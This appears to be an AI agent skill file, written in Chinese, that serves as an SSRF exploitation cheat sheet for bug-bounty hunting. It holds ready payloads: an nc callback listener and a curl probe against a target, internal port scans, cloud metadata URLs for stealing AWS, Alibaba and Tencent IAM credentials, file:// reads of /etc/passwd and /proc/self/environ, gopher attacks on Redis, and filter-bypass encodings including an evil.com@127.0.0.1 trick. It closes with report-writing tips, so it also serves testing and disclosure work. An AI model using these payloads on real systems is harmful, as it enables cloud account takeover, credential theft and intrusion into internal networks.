---
name: ssrf-pwn
description: SSRF服务端请求伪造——内网探测/云元数据攻击/协议绕过。Use when 看到url=/proxy=/图片加载/文件预览/Webhook回调参数。
---

# SSRF 挖掘与利用

> 蒸馏自CC挖洞武器库 ssrf-完整手册（Level 1-8实战验证）

## 快速检测

```bash
# 找SSRF点：url/uri/path/src/redirect/callback/webhook/import/load参数
# 探测：请求自己的监听端口
# 本地监听（另一终端）
nc -lvnp 9999
# 目标参数指向
curl "http://T/fetch?url=http://<本机IP>:9999/"
# 收到连接 = SSRF确认
```

## 内网探测（拿SSRF后）

```bash
# 扫内网端口（用SSRF当代理）
http://127.0.0.1:80 / :3306 / :6379 / :8080 / :9200
http://10.0.0.1-254:80 常见网段
# 响应差异判断：连接成功 vs 失败（超时/错误信息不同）
# 协议探测：file:///etc/passwd、gopher://（打Redis）、dict://
```

## 云元数据攻击（SSRF在云上）

```bash
# AWS（经典）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 阿里云
http://100.100.100.200/latest/meta-data/
# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/
# 拿到的临时凭据 → 调云API（见 cloud-attack skill）
```

## 绕过技术（127.0.0.1被拦）

```
IP变形：127.0.0.1 → 127.1 / 2130706433 / 0x7f000001 / [::1] / 0177.0.0.1
DNS重绑：解析到127.0.0.1的域名（spoofed.burpcollaborator.net）
URL解析差异：http://evil.com@127.0.0.1、http://127.0.0.1#evil.com
重定向：http://redirect-service/?url=127.0.0.1（目标跟随跳转）
协议：file://、gopher://、dict://、ftp://
编码：%31%32%37%2e%30%2e%30%2e%31、双编码
```

## 危害升级（低危→中危/高危）

- 读云元数据拿AK/SK → 云接管（高危）
- 打内网Redis/MySQL → 横向（中危-高危）
- 读本地文件（file:///etc/passwd、/proc/self/environ）→ 中危
- 仅端口探测 → 低危（SRC可能不收）

## 提交要点

- 危害描述写"可访问内网服务/云元数据/读取文件"，不要只说"存在SSRF"
- 有OOB证据（dnslog/监听端口收到连接）最有说服力
